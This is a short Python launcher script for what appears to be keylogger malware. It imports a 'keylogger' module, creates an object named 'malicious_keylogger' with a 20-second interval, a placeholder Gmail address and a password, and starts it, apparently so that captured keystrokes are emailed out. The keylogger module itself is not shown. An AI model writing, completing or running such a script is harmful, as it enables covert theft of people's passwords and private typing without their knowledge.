#!/usr/bin/env python

import keylogger


# Initialize / create keylogger

malicious_keylogger = keylogger.KeyLogger(20, 'youremail@gmail.com','yourpassword')

# Execute Keylogger

malicious_keylogger.start()


